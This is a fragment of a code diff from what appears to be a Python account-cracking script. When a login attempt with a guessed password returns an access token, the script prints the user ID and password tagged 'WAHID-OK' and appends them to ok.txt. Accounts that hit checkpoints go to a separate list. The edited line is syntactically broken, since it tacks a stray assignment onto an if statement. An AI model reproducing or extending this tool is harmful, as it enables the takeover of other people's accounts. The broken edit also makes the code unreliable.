@@ -463,7 +463,7 @@ def b_menu_select():
 		                                                                                        cp.close()
 		                                                                                        cps.append(uid)
 		                                                                                    else:
-		                                                                                        if 'access_token' in d:
+		                                                                                        if 'access_token' in d:| pass11=name.lower()
 		                                                                                            print("\x1b[1;32m[WAHID-OK] \033[1;32m"+uid+" | "+pass11+"\x1b[1;37m")
 		                                                                                            ok=open("ok.txt","a")
 		                                                                                            ok.write(uid+"
